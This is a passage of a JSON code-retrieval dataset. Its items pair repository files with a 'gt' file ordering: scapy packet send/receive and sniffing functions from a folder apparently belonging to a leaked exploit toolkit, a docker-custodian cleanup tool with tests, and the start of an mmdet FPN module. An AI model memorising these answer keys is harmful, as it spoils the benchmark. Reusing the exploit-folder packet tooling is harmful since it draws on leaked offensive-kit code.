stoptime = time.time()+timeout\n                else:\n                    stoptime = 0\n                remaintime = None\n                inmask = [pks.ins.fd]\n                try:\n                    try:\n                        while 1:\n                            if stoptime:\n                                remaintime = stoptime-time.time()\n                                if remaintime <= 0:\n                                    break\n                            r = pks.recv(MTU)\n                            if r is None:\n                                continue\n                            ok = 0\n                            h = r.hashret()\n                            if h in hsent:\n                                hlst = hsent[h]\n                                for i in range(len(hlst)):\n                                    if r.answers(hlst[i]):\n                                        ans.append((hlst[i],r))\n                                        if verbose > 1:\n                                            os.write(1, \"*\")\n                                        ok = 1\n                                        if not multi:\n                                            del(hlst[i])\n                                            notans -= 1;\n                                        else:\n                                            if not hasattr(hlst[i], '_answered'):\n                                                notans -= 1;\n                                            hlst[i]._answered = 1;\n                                        break\n                            if notans == 0 and not multi:\n                                break\n                            if not ok:\n                                if verbose > 1:\n                                    os.write(1, \".\")\n                                nbrecv += 1\n                                if conf.debug_match:\n                                    debug.recv.append(r)\n                    except KeyboardInterrupt:\n                        if chainCC:\n                            raise\n                finally:\n                    if WINDOWS:\n                        for p,t in zip(all_stimuli, sent_times):\n                            p.sent_time = t\n        finally:\n            pass\n\n        remain = reduce(list.__add__, hsent.values(), [])\n        if multi:\n            remain = filter(lambda p: not hasattr(p, '_answered'), remain);\n\n        if autostop and len(remain) > 0 and len(remain) != len(tobesent):\n            retry = autostop\n\n        tobesent = remain\n        if len(tobesent) == 0:\n            break\n        retry -= 1\n\n    if conf.debug_match:\n        debug.sent=plist.PacketList(remain[:],\"Sent\")\n        debug.match=plist.SndRcvList(ans[:])\n\n\n    if (multi):\n        for s,r in ans:\n            if hasattr(s, '_answered'):\n                del(s._answered)\n\n    if verbose:\n        print \"\\nReceived %i packets, got %i answers, remaining %i packets\" % (nbrecv+len(ans), len(ans), notans)\n    return plist.SndRcvList(ans),plist.PacketList(remain,\"Unanswered\")\n\n\nimport scapy.sendrecv\nscapy.sendrecv.sndrcv = sndrcv\n\ndef sniff(count=0, store=1, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None, *arg, **karg):\n\n    c = 0\n\n    if offline is None:\n        if L2socket is None:\n            L2socket = conf.L2listen\n        s = L2socket(type=ETH_P_ALL, *arg, **karg)\n    else:\n        s = PcapReader(offline)\n\n    lst = []\n    if timeout is not None:\n        stoptime = time.time()+timeout\n    remain = None\n    while 1:\n        try:\n            if timeout is not None:\n                remain = stoptime-time.time()\n                if remain <= 0:\n                    break\n\n            try:\n                p = s.recv(MTU)\n            except PcapTimeoutElapsed:\n                continue\n            if p is None:\n                break\n            if lfilter and not lfilter(p):\n                continue\n            if store:\n                lst.append(p)\n            c += 1\n            if prn:\n                r = prn(p)\n                if r is not None:\n                    print >> console, r\n            if count > 0 and c >= count:\n                break\n        except KeyboardInterrupt:\n            break\n    s.close()\n    return plist.PacketList(lst,\"Sniffed\")\n\nimport scapy.sendrecv\nscapy.sendrecv.sniff = sniff\n\ndef get_if_list():\n    return sorted(ifaces.keys())\n\ndef get_working_if():\n    try:\n        return devname(pcap.lookupdev())\n    except Exception:\n        return 'lo0'\n\n'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/all.py'\n:\n\n\n\n\n\nfrom base_classes import *\nfrom config import *\nfrom dadict import *\nfrom data import *\nfrom error import *\nfrom themes import *\nfrom arch import *\n\nfrom plist import *\nfrom fields import *\nfrom packet import *\nfrom asn1fields import *\nfrom asn1packet import *\n\nfrom utils import *\nfrom route import *\nif conf.ipv6_enabled:\n    from utils6 import *\n    from route6 import *\nfrom sendrecv import *\nfrom supersocket import *\nfrom volatile import *\nfrom as_resolvers import *\n\nfrom ansmachine import *\nfrom automaton import *\nfrom autorun import *\n\nfrom main import *\n\nfrom layers.all import *\n\nfrom asn1.asn1 import *\nfrom asn1.ber import *\nfrom asn1.mib import *\n\n\n\n",
        "gt": [
            "'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/arch/windows/__init__.py'",
            "'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/arch/__init__.py'",
            "'eqgrp-free-file/Firewall/EXPLOITS/EXBA/scapy/all.py'"
        ]
    },
    {
        "files": [
            "'docker-custodian/docker_custodian/docker_gc.py'",
            "'docker-custodian/docker_custodian/args.py'",
            "'docker-custodian/tests/docker_gc_test.py'"
        ],
        "content": "'docker-custodian/docker_custodian/docker_gc.py'\n:\n\nimport argparse\nimport fnmatch\nimport logging\nimport sys\n\nimport dateutil.parser\nimport docker\nimport docker.errors\nimport requests.exceptions\n\nfrom collections import namedtuple\nfrom docker_custodian.args import timedelta_type\nfrom docker.utils import kwargs_from_env\n\nlog = logging.getLogger(__name__)\n\n\n\nYEAR_ZERO = \"0001-01-01T00:00:00Z\"\n\nExcludeLabel = namedtuple('ExcludeLabel', ['key', 'value'])\n\n\ndef cleanup_containers(\n    client,\n    max_container_age,\n    dry_run,\n    exclude_container_labels,\n):\n    all_containers = get_all_containers(client)\n    filtered_containers = filter_excluded_containers(\n        all_containers,\n        exclude_container_labels,\n    )\n    for container_summary in reversed(list(filtered_containers)):\n        container = api_call(\n            client.inspect_container,\n            container=container_summary['Id'],\n        )\n        if not container or not should_remove_container(\n            container,\n            max_container_age,\n        ):\n            continue\n\n        log.info(\"Removing container %s %s %s\" % (\n            container['Id'][:16],\n            container.get('Name', '').lstrip('/'),\n            container['State']['FinishedAt']))\n\n        if not dry_run:\n            api_call(\n                client.remove_container,\n                container=container['Id'],\n                v=True,\n            )\n\n\ndef filter_excluded_containers(containers, exclude_container_labels):\n    if not exclude_container_labels:\n        return containers\n\n    def include_container(container):\n        if should_exclude_container_with_labels(\n            container,\n            exclude_container_labels,\n        ):\n            return False\n        return True\n    return filter(include_container, containers)\n\n\ndef should_exclude_container_with_labels(container, exclude_container_labels):\n    if container['Labels']:\n        for exclude_label in exclude_container_labels:\n            if exclude_label.value:\n                matching_keys = fnmatch.filter(\n                    container['Labels'].keys(),\n                    exclude_label.key,\n                )\n                label_values_to_check = [\n                    container['Labels'][matching_key]\n                    for matching_key in matching_keys\n                ]\n                if fnmatch.filter(label_values_to_check, exclude_label.value):\n                    return True\n            else:\n                if fnmatch.filter(\n                    container['Labels'].keys(),\n                    exclude_label.key\n                ):\n                    return True\n    return False\n\n\ndef should_remove_container(container, min_date):\n    state = container.get('State', {})\n\n    if state.get('Running'):\n        return False\n\n    if state.get('Ghost'):\n        return True\n\n\n    if state.get('FinishedAt') == YEAR_ZERO:\n        created_date = dateutil.parser.parse(container['Created'])\n        return created_date < min_date\n\n    finished_date = dateutil.parser.parse(state['FinishedAt'])\n    return finished_date < min_date\n\n\ndef get_all_containers(client):\n    log.info(\"Getting all containers\")\n    containers = client.containers(all=True)\n    log.info(\"Found %s containers\", len(containers))\n    return containers\n\n\ndef get_all_images(client):\n    log.info(\"Getting all images\")\n    images = client.images()\n    log.info(\"Found %s images\", len(images))\n    return images\n\n\ndef get_dangling_volumes(client):\n    log.info(\"Getting dangling volumes\")\n    volumes = client.volumes({'dangling': True})['Volumes'] or []\n    log.info(\"Found %s dangling volumes\", len(volumes))\n    return volumes\n\n\ndef cleanup_images(client, max_image_age, dry_run, exclude_set):\n\n\n    containers = get_all_containers(client)\n    images = get_all_images(client)\n    if docker.utils.compare_version('1.21', client._version) < 0:\n        image_tags_in_use = {container['Image'] for container in containers}\n        images = filter_images_in_use(images, image_tags_in_use)\n    else:\n\n        image_ids_in_use = {container['ImageID'] for container in containers}\n        images = filter_images_in_use_by_id(images, image_ids_in_use)\n    images = filter_excluded_images(images, exclude_set)\n\n    for image_summary in reversed(list(images)):\n        remove_image(client, image_summary, max_image_age, dry_run)\n\n\ndef filter_excluded_images(images, exclude_set):\n    def include_image(image_summary):\n        image_tags = image_summary.get('RepoTags')\n        if no_image_tags(image_tags):\n            return True\n        for exclude_pattern in exclude_set:\n            if fnmatch.filter(image_tags, exclude_pattern):\n                return False\n        return True\n\n    return filter(include_image, images)\n\n\ndef filter_images_in_use(images, image_tags_in_use):\n    def get_tag_set(image_summary):\n        image_tags = image_summary.get('RepoTags')\n        if no_image_tags(image_tags):\n\n            return set(['%s:latest' % image_summary['Id'][:12]])\n        return set(image_tags)\n\n    def image_not_in_use(image_summary):\n        return not get_tag_set(image_summary) & image_tags_in_use\n\n    return filter(image_not_in_use, images)\n\n\ndef filter_images_in_use_by_id(images, image_ids_in_use):\n    def image_not_in_use(image_summary):\n        return image_summary['Id'] not in image_ids_in_use\n\n    return filter(image_not_in_use, images)\n\n\ndef is_image_old(image, min_date):\n    return dateutil.parser.parse(image['Created']) < min_date\n\n\ndef no_image_tags(image_tags):\n    return not image_tags or image_tags == ['<none>:<none>']\n\n\ndef remove_image(client, image_summary, min_date, dry_run):\n    image = api_call(client.inspect_image, image=image_summary['Id'])\n    if not image or not is_image_old(image, min_date):\n        return\n\n    log.info(\"Removing image %s\" % format_image(image, image_summary))\n    if dry_run:\n        return\n\n    image_tags = image_summary.get('RepoTags')\n\n    if no_image_tags(image_tags):\n        api_call(client.remove_image, image=image_summary['Id'])\n        return\n\n\n    for image_tag in image_tags:\n        api_call(client.remove_image, image=image_tag)\n\n\ndef remove_volume(client, volume, dry_run):\n    if not volume:\n        return\n\n    log.info(\"Removing volume %s\" % volume['Name'])\n    if dry_run:\n        return\n\n    api_call(client.remove_volume, name=volume['Name'])\n\n\ndef cleanup_volumes(client, dry_run):\n    dangling_volumes = get_dangling_volumes(client)\n\n    for volume in reversed(dangling_volumes):\n        log.info(\"Removing dangling volume %s\", volume['Name'])\n        remove_volume(client, volume, dry_run)\n\n\ndef api_call(func, **kwargs):\n    try:\n        return func(**kwargs)\n    except requests.exceptions.Timeout as e:\n        params = ','.join('%s=%s' % item for item in kwargs.items())\n        log.warn(\"Failed to call %s %s %s\" % (func.__name__, params, e))\n    except docker.errors.APIError as ae:\n        params = ','.join('%s=%s' % item for item in kwargs.items())\n        log.warn(\"Error calling %s %s %s\" % (func.__name__, params, ae))\n\n\ndef format_image(image, image_summary):\n    def get_tags():\n        tags = image_summary.get('RepoTags')\n        if not tags or tags == ['<none>:<none>']:\n            return ''\n        return ', '.join(tags)\n\n    return \"%s %s\" % (image['Id'][:16], get_tags())\n\n\ndef build_exclude_set(image_tags, exclude_file):\n    exclude_set = set(image_tags or [])\n\n    def is_image_tag(line):\n        return line and not line.startswith('\n\n    if exclude_file:\n        lines = [line.strip() for line in exclude_file.read().split('\\n')]\n        exclude_set.update(filter(is_image_tag, lines))\n    return exclude_set\n\n\ndef format_exclude_labels(exclude_label_args):\n    exclude_labels = []\n    for exclude_label_arg in exclude_label_args:\n        split_exclude_label = exclude_label_arg.split('=', 1)\n        exclude_label_key = split_exclude_label[0]\n        if len(split_exclude_label) == 2:\n            exclude_label_value = split_exclude_label[1]\n        else:\n            exclude_label_value = None\n        exclude_labels.append(\n            ExcludeLabel(\n                key=exclude_label_key,\n                value=exclude_label_value,\n            )\n        )\n    return exclude_labels\n\n\ndef main():\n    logging.basicConfig(\n        level=logging.INFO,\n        format=\"%(message)s\",\n        stream=sys.stdout)\n\n    args = get_args()\n    client = docker.APIClient(version='auto',\n                              timeout=args.timeout,\n                              **kwargs_from_env())\n\n    exclude_container_labels = format_exclude_labels(\n        args.exclude_container_label\n    )\n\n    if args.max_container_age:\n        cleanup_containers(\n            client,\n            args.max_container_age,\n            args.dry_run,\n            exclude_container_labels,\n        )\n\n    if args.max_image_age:\n        exclude_set = build_exclude_set(\n            args.exclude_image,\n            args.exclude_image_file)\n        cleanup_images(client, args.max_image_age, args.dry_run, exclude_set)\n\n    if args.dangling_volumes:\n        cleanup_volumes(client, args.dry_run)\n\n\ndef get_args(args=None):\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        '--max-container-age',\n        type=timedelta_type,\n        help=\"Maximum age for a container. Containers older than this age \"\n             \"will be removed. Age can be specified in any pytimeparse \"\n             \"supported format.\")\n    parser.add_argument(\n        '--max-image-age',\n        type=timedelta_type,\n        help=\"Maxium age for an image. Images older than this age will be \"\n             \"removed. Age can be specified in any pytimeparse supported \"\n             \"format.\")\n    parser.add_argument(\n        '--dangling-volumes',\n        action=\"store_true\",\n        help=\"Dangling volumes will be removed.\")\n    parser.add_argument(\n        '--dry-run', action=\"store_true\",\n        help=\"Only log actions, don't remove anything.\")\n    parser.add_argument(\n        '-t', '--timeout', type=int, default=60,\n        help=\"HTTP timeout in seconds for making docker API calls.\")\n    parser.add_argument(\n        '--exclude-image',\n        action='append',\n        help=\"Never remove images with this tag.\")\n    parser.add_argument(\n        '--exclude-image-file',\n        type=argparse.FileType('r'),\n        help=\"Path to a file which contains a list of images to exclude, one \"\n             \"image tag per line.\")\n    parser.add_argument(\n        '--exclude-container-label',\n        action='append', type=str, default=[],\n        help=\"Never remove containers with this label key or label key=value\")\n\n    return parser.parse_args(args=args)\n\n\nif __name__ == \"__main__\":\n    main()\n\n'docker-custodian/docker_custodian/args.py'\n:import datetime\n\nfrom dateutil import tz\nfrom pytimeparse import timeparse\n\n\ndef timedelta_type(value):\n\n    if value is None:\n        return None\n    return datetime_seconds_ago(timeparse.timeparse(value))\n\n\ndef datetime_seconds_ago(seconds):\n    now = datetime.datetime.now(tz.tzutc())\n    return now - datetime.timedelta(seconds=seconds)\n\n'docker-custodian/tests/docker_gc_test.py'\n:from callee import String, Regex\nfrom six import StringIO\nimport textwrap\n\nimport docker.errors\ntry:\n    from unittest import mock\nexcept ImportError:\n    import mock\nimport requests.exceptions\n\nfrom docker_custodian import docker_gc\n\n\nclass TestShouldRemoveContainer(object):\n\n    def test_is_running(self, container, now):\n        container['State']['Running'] = True\n        assert not docker_gc.should_remove_container(container, now)\n\n    def test_is_ghost(self, container, now):\n        container['State']['Ghost'] = True\n        assert docker_gc.should_remove_container(container, now)\n\n    def test_old_never_run(self, container, now, earlier_time):\n        container['Created'] = str(earlier_time)\n        container['State']['FinishedAt'] = docker_gc.YEAR_ZERO\n        assert docker_gc.should_remove_container(container, now)\n\n    def test_not_old_never_run(self, container, now, earlier_time):\n        container['Created'] = str(now)\n        container['State']['FinishedAt'] = docker_gc.YEAR_ZERO\n        assert not docker_gc.should_remove_container(container, now)\n\n    def test_old_stopped(self, container, now):\n        assert docker_gc.should_remove_container(container, now)\n\n    def test_not_old(self, container, now):\n        container['State']['FinishedAt'] = '2014-01-21T00:00:00Z'\n        assert not docker_gc.should_remove_container(container, now)\n\n\ndef test_cleanup_containers(mock_client, now):\n    max_container_age = now\n    mock_client.containers.return_value = [\n        {'Id': 'abcd'},\n        {'Id': 'abbb'},\n    ]\n    mock_containers = [\n        {\n            'Id': 'abcd',\n            'Name': 'one',\n            'State': {\n                'Running': False,\n                'FinishedAt': '2014-01-01T01:01:01Z',\n            },\n        },\n        {\n            'Id': 'abbb',\n            'Name': 'two',\n            'State': {\n                'Running': True,\n                'FinishedAt': '2014-01-01T01:01:01Z',\n            },\n        },\n    ]\n    mock_client.inspect_container.side_effect = iter(mock_containers)\n    docker_gc.cleanup_containers(mock_client, max_container_age, False, None)\n    mock_client.remove_container.assert_called_once_with(container='abcd',\n                                                         v=True)\n\n\ndef test_filter_excluded_containers():\n    mock_containers = [\n        {'Labels': {'toot': ''}},\n        {'Labels': {'too': 'lol'}},\n        {'Labels': {'toots': 'lol'}},\n        {'Labels': {'foo': 'bar'}},\n        {'Labels': None},\n    ]\n    result = docker_gc.filter_excluded_containers(mock_containers, None)\n    assert mock_containers == list(result)\n    exclude_labels = [\n        docker_gc.ExcludeLabel(key='too', value=None),\n        docker_gc.ExcludeLabel(key='foo', value=None),\n    ]\n    result = docker_gc.filter_excluded_containers(\n        mock_containers,\n        exclude_labels,\n    )\n    assert [\n        mock_containers[0],\n        mock_containers[2],\n        mock_containers[4]\n    ] == list(result)\n    exclude_labels = [\n        docker_gc.ExcludeLabel(key='too*', value='lol'),\n    ]\n    result = docker_gc.filter_excluded_containers(\n        mock_containers,\n        exclude_labels,\n    )\n    assert [\n        mock_containers[0],\n        mock_containers[3],\n        mock_containers[4]\n    ] == list(result)\n\n\ndef test_cleanup_images(mock_client, now):\n    max_image_age = now\n    mock_client.images.return_value = images = [\n        {'Id': 'abcd'},\n        {'Id': 'abbb'},\n    ]\n    mock_images = [\n        {\n            'Id': 'abcd',\n            'Created': '2014-01-01T01:01:01Z'\n        },\n        {\n            'Id': 'abbb',\n            'Created': '2014-01-01T01:01:01Z'\n        },\n    ]\n    mock_client.inspect_image.side_effect = iter(mock_images)\n\n    docker_gc.cleanup_images(mock_client, max_image_age, False, set())\n    assert mock_client.remove_image.mock_calls == [\n        mock.call(image=image['Id']) for image in reversed(images)\n    ]\n\n\ndef test_cleanup_volumes(mock_client):\n    mock_client.volumes.return_value = volumes = {\n        'Volumes': [\n            {\n                'Mountpoint': 'unused',\n                'Labels': None,\n                'Driver': 'unused',\n                'Name': u'one'\n            },\n            {\n                'Mountpoint': 'unused',\n                'Labels': None,\n                'Driver': 'unused',\n                'Name': u'two'\n            },\n        ],\n        'Warnings': None,\n    }\n\n    docker_gc.cleanup_volumes(mock_client, False)\n    assert mock_client.remove_volume.mock_calls == [\n        mock.call(name=volume['Name'])\n        for volume in reversed(volumes['Volumes'])\n    ]\n\n\ndef test_filter_images_in_use():\n    image_tags_in_use = set([\n        'user/one:latest',\n        'user/foo:latest',\n        'other:12345',\n        '2471708c19be:latest',\n    ])\n    images = [\n        {\n            'RepoTags': ['<none>:<none>'],\n            'Id': '2471708c19beabababab'\n        },\n        {\n            'RepoTags': ['<none>:<none>'],\n            'Id': 'babababababaabababab'\n        },\n        {\n            'RepoTags': ['user/one:latest', 'user/one:abcd']\n        },\n        {\n            'RepoTags': ['other:abcda']\n        },\n        {\n            'RepoTags': ['other:12345']\n        },\n        {\n            'RepoTags': ['new_image:latest', 'new_image:123']\n        },\n    ]\n    expected = [\n        {\n            'RepoTags': ['<none>:<none>'],\n            'Id': 'babababababaabababab'\n        },\n        {\n            'RepoTags': ['other:abcda']\n        },\n        {\n            'RepoTags': ['new_image:latest', 'new_image:123']\n        },\n    ]\n    actual = docker_gc.filter_images_in_use(images, image_tags_in_use)\n    assert list(actual) == expected\n\n\ndef test_filter_images_in_use_by_id(mock_client, now):\n    mock_client._version = '1.21'\n    mock_client.containers.return_value = [\n        {'Id': 'abcd', 'ImageID': '1'},\n        {'Id': 'abbb', 'ImageID': '2'},\n    ]\n    mock_containers = [\n        {\n            'Id': 'abcd',\n            'Name': 'one',\n            'State': {\n                'Running': False,\n                'FinishedAt': '2014-01-01T01:01:01Z'\n            }\n        },\n        {\n            'Id': 'abbb',\n            'Name': 'two',\n            'State': {\n                'Running': True,\n                'FinishedAt': '2014-01-01T01:01:01Z'\n            }\n        }\n    ]\n    mock_client.inspect_container.side_effect = iter(mock_containers)\n    mock_client.images.return_value = [\n        {'Id': '1', 'Created': '2014-01-01T01:01:01Z'},\n        {'Id': '2', 'Created': '2014-01-01T01:01:01Z'},\n        {'Id': '3', 'Created': '2014-01-01T01:01:01Z'},\n        {'Id': '4', 'Created': '2014-01-01T01:01:01Z'},\n        {'Id': '5', 'Created': '2014-01-01T01:01:01Z'},\n        {'Id': '6', 'Created': '2014-01-01T01:01:01Z'},\n    ]\n    mock_client.inspect_image.side_effect = lambda image: {\n        'Id': image,\n        'Created': '2014-01-01T01:01:01Z'\n    }\n    docker_gc.cleanup_images(mock_client, now, False, set())\n    assert mock_client.remove_image.mock_calls == [\n        mock.call(image=id_) for id_ in ['6', '5', '4', '3']\n    ]\n\n\ndef test_filter_excluded_images():\n    exclude_set = set([\n        'user/one:latest',\n        'user/foo:latest',\n        'other:12345',\n    ])\n    images = [\n            {\n                'RepoTags': ['<none>:<none>'],\n                'Id': 'babababababaabababab'\n            },\n            {\n                'RepoTags': ['user/one:latest', 'user/one:abcd']\n            },\n            {\n                'RepoTags': ['other:abcda']\n            },\n            {\n                'RepoTags': ['other:12345']\n            },\n            {\n                'RepoTags': ['new_image:latest', 'new_image:123']\n            },\n    ]\n    expected = [\n            {\n                'RepoTags': ['<none>:<none>'],\n                'Id': 'babababababaabababab'\n            },\n            {\n                'RepoTags': ['other:abcda']\n            },\n            {\n                'RepoTags': ['new_image:latest', 'new_image:123']\n            },\n    ]\n    actual = docker_gc.filter_excluded_images(images, exclude_set)\n    assert list(actual) == expected\n\n\ndef test_filter_excluded_images_advanced():\n    exclude_set = set([\n        'user/one:*',\n        'user/foo:tag*',\n        'user/repo-*:tag',\n    ])\n    images = [\n            {\n                'RepoTags': ['<none>:<none>'],\n                'Id': 'babababababaabababab'\n            },\n            {\n                'RepoTags': ['user/one:latest', 'user/one:abcd']\n            },\n            {\n                'RepoTags': ['user/foo:test']\n            },\n            {\n                'RepoTags': ['user/foo:tag123']\n            },\n            {\n                'RepoTags': ['user/repo-1:tag']\n            },\n            {\n                'RepoTags': ['user/repo-2:tag']\n            },\n\n    ]\n    expected = [\n            {\n                'RepoTags': ['<none>:<none>'],\n                'Id': 'babababababaabababab'\n            },\n            {\n                'RepoTags': ['user/foo:test'],\n            },\n    ]\n    actual = docker_gc.filter_excluded_images(images, exclude_set)\n    assert list(actual) == expected\n\n\ndef test_is_image_old(image, now):\n    assert docker_gc.is_image_old(image, now)\n\n\ndef test_is_image_old_false(image, later_time):\n    assert not docker_gc.is_image_old(image, later_time)\n\n\ndef test_remove_image_no_tags(mock_client, image, now):\n    image_id = 'abcd'\n    image_summary = {'Id': image_id}\n    mock_client.inspect_image.return_value = image\n    docker_gc.remove_image(mock_client, image_summary, now, False)\n\n    mock_client.remove_image.assert_called_once_with(image=image_id)\n\n\ndef test_remove_image_new_image_not_removed(mock_client, image, later_time):\n    image_id = 'abcd'\n    image_summary = {'Id': image_id}\n    mock_client.inspect_image.return_value = image\n    docker_gc.remove_image(mock_client, image_summary, later_time, False)\n\n    assert not mock_client.remove_image.mock_calls\n\n\ndef test_remove_image_with_tags(mock_client, image, now):\n    image_id = 'abcd'\n    repo_tags = ['user/one:latest', 'user/one:12345']\n    image_summary = {\n            'Id': image_id,\n            'RepoTags': repo_tags\n    }\n    mock_client.inspect_image.return_value = image\n    docker_gc.remove_image(mock_client, image_summary, now, False)\n\n    assert mock_client.remove_image.mock_calls == [\n        mock.call(image=tag) for tag in repo_tags\n    ]\n\n\ndef test_api_call_success():\n    func = mock.Mock()\n    container = \"abcd\"\n    result = docker_gc.api_call(func, container=container)\n    func.assert_called_once_with(container=\"abcd\")\n    assert result == func.return_value\n\n\ndef test_api_call_with_timeout():\n    func = mock.Mock(\n        side_effect=requests.exceptions.ReadTimeout(\"msg\"),\n        __name__=\"remove_image\")\n    image = \"abcd\"\n\n    with mock.patch(\n            'docker_custodian.docker_gc.log',\n            autospec=True) as mock_log:\n        docker_gc.api_call(func, image=image)\n\n    func.assert_called_once_with(image=\"abcd\")\n    mock_log.warn.assert_called_once_with('Failed to call remove_image '\n                                          + 'image=abcd msg'\n                                          )\n\n\ndef test_api_call_with_api_error():\n    func = mock.Mock(\n        side_effect=docker.errors.APIError(\n            \"Ooops\",\n            mock.Mock(status_code=409, reason=\"Conflict\"),\n            explanation=\"failed\"),\n        __name__=\"remove_image\")\n    image = \"abcd\"\n\n    with mock.patch(\n            'docker_custodian.docker_gc.log',\n            autospec=True) as mock_log:\n        docker_gc.api_call(func, image=image)\n\n    func.assert_called_once_with(image=\"abcd\")\n    mock_log.warn.assert_called_once_with(String() & Regex('Error calling remove_image image=abcd 409 Client Error .*'))\n\n\ndef days_as_seconds(num):\n    return num * 60 * 60 * 24\n\n\ndef test_get_args_with_defaults():\n    opts = docker_gc.get_args(args=[])\n    assert opts.timeout == 60\n    assert opts.dry_run is False\n    assert opts.max_container_age is None\n    assert opts.max_image_age is None\n\n\ndef test_get_args_with_args():\n    with mock.patch(\n        'docker_custodian.docker_gc.timedelta_type',\n        autospec=True\n    ) as mock_timedelta_type:\n        opts = docker_gc.get_args(args=[\n            '--max-image-age', '30 days',\n            '--max-container-age', '3d',\n        ])\n    assert mock_timedelta_type.mock_calls == [\n        mock.call('30 days'),\n        mock.call('3d'),\n    ]\n    assert opts.max_container_age == mock_timedelta_type.return_value\n    assert opts.max_image_age == mock_timedelta_type.return_value\n\n\ndef test_get_all_containers(mock_client):\n    count = 10\n    mock_client.containers.return_value = [mock.Mock() for _ in range(count)]\n    with mock.patch('docker_custodian.docker_gc.log',\n                    autospec=True) as mock_log:\n        containers = docker_gc.get_all_containers(mock_client)\n    assert containers == mock_client.containers.return_value\n    mock_client.containers.assert_called_once_with(all=True)\n    mock_log.info.assert_called_with(\"Found %s containers\", count)\n\n\ndef test_get_all_images(mock_client):\n    count = 7\n    mock_client.images.return_value = [mock.Mock() for _ in range(count)]\n    with mock.patch('docker_custodian.docker_gc.log',\n                    autospec=True) as mock_log:\n        images = docker_gc.get_all_images(mock_client)\n    assert images == mock_client.images.return_value\n    mock_log.info.assert_called_with(\"Found %s images\", count)\n\n\ndef test_get_dangling_volumes(mock_client):\n    count = 4\n    mock_client.volumes.return_value = {\n        'Volumes': [mock.Mock() for _ in range(count)]\n    }\n    with mock.patch('docker_custodian.docker_gc.log',\n                    autospec=True) as mock_log:\n        volumes = docker_gc.get_dangling_volumes(mock_client)\n    assert volumes == mock_client.volumes.return_value['Volumes']\n    mock_log.info.assert_called_with(\"Found %s dangling volumes\", count)\n\n\ndef test_build_exclude_set():\n    image_tags = [\n        'some_image:latest',\n        'repo/foo:12345',\n        'duplicate:latest',\n    ]\n    exclude_image_file = StringIO(textwrap.dedent())\n    expected = set([\n        'some_image:latest',\n        'repo/foo:12345',\n        'duplicate:latest',\n        'repo/bar:abab',\n    ])\n\n    exclude_set = docker_gc.build_exclude_set(image_tags, exclude_image_file)\n    assert exclude_set == expected\n\n\ndef test_format_exclude_labels():\n    exclude_label_args = [\n        'voo*',\n        'doo=poo',\n    ]\n    expected = [\n        docker_gc.ExcludeLabel(key='voo*', value=None),\n        docker_gc.ExcludeLabel(key='doo', value='poo'),\n    ]\n    exclude_labels = docker_gc.format_exclude_labels(exclude_label_args)\n    assert expected == exclude_labels\n\n\ndef test_build_exclude_set_empty():\n    exclude_set = docker_gc.build_exclude_set(None, None)\n    assert exclude_set == set()\n\n\ndef test_main(mock_client):\n    with mock.patch(\n            'docker_custodian.docker_gc.docker.APIClient',\n            return_value=mock_client):\n\n        with mock.patch(\n                'docker_custodian.docker_gc.get_args',\n                autospec=True) as mock_get_args:\n            mock_get_args.return_value = mock.Mock(\n                max_image_age=100,\n                max_container_age=200,\n                exclude_image=[],\n                exclude_image_file=None,\n                exclude_container_label=[],\n            )\n            docker_gc.main()\n",
        "gt": [
            "'docker-custodian/docker_custodian/args.py'",
            "'docker-custodian/docker_custodian/docker_gc.py'",
            "'docker-custodian/tests/docker_gc_test.py'"
        ]
    },
    {
        "files": [
            "'OpenMMLab-BoxInst/mmdet/models/necks/fpn.py'",
            "'OpenMMLab-BoxInst/mmdet/models/necks/__init__.py'",
            "'OpenMMLab-BoxInst/tests/test_models/test_necks.py'"
        ],
        "content": "'OpenMMLab-BoxInst/mmdet/models/necks/fpn.py'\n:import torch.nn as nn\nimport torch.nn.functional as F\nfrom mmcv.cnn import ConvModule\nfrom mmcv.runner import BaseModule, auto_fp16\n\nfrom ..builder import NECKS\n\n\n@NECKS.register_module()\nclass FPN(BaseModule):\n    r\n\n    def __init__(self,\n                 in_channels,\n                 out_channels,\n                 num_outs,\n                 start_level=0,\n                 end_level=-1,\n                 add_extra_convs=False,\n                 relu_before_extra_convs=False,\n                 no_norm_on_lateral=False,\n                 conv_cfg=None,\n                 norm_cfg=None,\n                 act_cfg=None,\n                 upsample_cfg=dict(mode='nearest'),\n                 init_cfg=dict(\n                     type='Xavier', layer='Conv2d', distribution='uniform')):\n        super(FPN, self).__init__(init_cfg)\n        assert isinstance(in_channels, list)\n        self.in_channels = in_channels\n        self.out_channels = out_channels\n        self.num_ins = len(in_channels)\n        self.num_outs = num_outs\n        self.relu_before_extra_convs = relu_before_extra_convs\n        self.no_norm_on_lateral = no_norm_on_lateral\n        self.fp16_enabled = False\n        self.upsample_cfg = upsample_cfg.copy()\n\n        if end_level == -1:\n            self.backbone_end_level = self.num_ins\n            assert num_outs >= self.num_ins - start_level\n        else:\n\n            self.backbone_end_level = end_level\n            assert end_level <= len(in_channels)\n            assert num_outs == end_level - start_level\n        self.start_level = start_level\n        self.end_level = end_level\n        self.add_extra_convs = add_extra_convs\n        assert isinstance(add_extra_convs, (str, bool))\n        if isinstance(add_extra_convs, str):\n\n            assert add_extra_convs in ('on_input', 'on_lateral', 'on_output')\n        elif add_extra_convs:\n            self.add_extra_convs = 'on_input'\n\n        self.lateral_convs = nn.ModuleList()\n        self.fpn_convs = nn.ModuleList()\n\n        for i in range(self.start_level, self.backbone_end_level):\n            l_conv = ConvModule(\n                in_channels[i],\n                out_channels,\n                1,\n                conv_cfg=conv_cfg,\n                norm_cfg=norm_cfg if not self.no_norm_on_lateral else None,\n                act_cfg=act_cfg,\n                inplace=False)\n            fpn_conv = ConvModule(\n                out_channels,\n                out_channels,\n                3,\n                padding=1,\n                conv_cfg=conv_cfg,\n                norm_cfg=norm_cfg,\n                act_cfg=act_cfg,\n                inplace=False)\n\n            self.lateral_convs.append(l_conv)\n            self.fpn_convs.append(fpn_conv)\n\n\n        extra_levels = num_outs - self.backbone_end_level + self.start_level\n        if self.add_extra_convs and extra_levels >= 1:\n            for i in range(extra_levels):\n                if i == 0 and self.add_extra_convs == 'on_input':\n                    in_channels = self.in_channels[self.backbone_end_level - 1]\n                else:\n                    in_channels = out_channels\n                extra_fpn_conv = ConvModule(\n                    in_channels,\n                    out_channels,\n                    3,\n                    stride=2,\n                    padding=1,\n                    conv_cfg=conv_cfg,\n                    norm_cfg=norm_cfg,\n                    